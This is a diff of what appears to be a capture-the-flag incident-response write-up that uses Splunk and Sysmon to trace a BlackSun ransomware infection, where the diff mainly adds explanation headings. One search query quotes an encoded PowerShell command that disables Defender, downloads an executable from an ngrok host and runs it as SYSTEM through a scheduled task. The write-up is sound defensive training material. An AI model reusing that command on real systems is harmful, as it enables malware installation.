@@ -139,6 +139,7 @@ This command immediately runs the scheduled task, causing the malware to execute
  > NT AUTHORITY\SYSTEM;”C:\Windows\system32\schtasks.exe” /Run /TN OUTSTANDING_GUTTER.exe
 
 **Explaination :**
+
 To find the command executed with elevated privileges, I searched Sysmon EventCode=1 (Process Creation), filtering by ParentCommandLine containing the encoded PowerShell command.
 ```
 index="*" EventCode=1 ParentCommandLine="powershell.exe  -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA" ComputerName="DESKTOP-TBV8NEF"
@@ -156,6 +157,8 @@ The binary ran as NT AUTHORITY\SYSTEM — confirmed by /RU SYSTEM in the /Create
 ---
 ## The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
 > hxxp[://]9030-181-215-214-32[.]ngrok[.]io
+
+**Explanation:**
 
 
 ```
@@ -181,6 +184,9 @@ By searching for PowerShell scripts (.ps1) dropped in C:\Windows\Temp\ using Tar
 ## The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?
 > BlackSun.ps1
 
+**Explanation:**
+
+
 To identify the actual name of the malicious script, I searched for the file hash of script.ps1 using TargetFilename filtered to C:\Windows\Temp\script.ps1. The Hashes field returned the cryptographic hash value of the file.
 
 I then took that hash value and submitted it to VirusTotal — a threat intelligence platform that checks files against multiple antivirus engines. VirusTotal matched the hash to a known malicious sample, which revealed the original name of the malicious script."
@@ -190,6 +196,9 @@ I then took that hash value and submitted it to VirusTotal — a threat intellig
 ---
 ## A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?
 > C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
+
+**Explanation:**
+
 
 Since ransomware typically drops a ransom note as a .txt file, I searched for any .txt files created on the system using a wildcard search on TargetFilename. This revealed a file named BlackSun_README.txt
 ```
@@ -203,9 +212,10 @@ index="*" "BlackSun_README.txt"
 
 ---
 
-**Explanation:**
 ## The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?
 > C:\Users\Public\Pictures\blacksun.jpg
+
+**Explanation:**
 
 ```
 index="*" "blacksun.jpg"
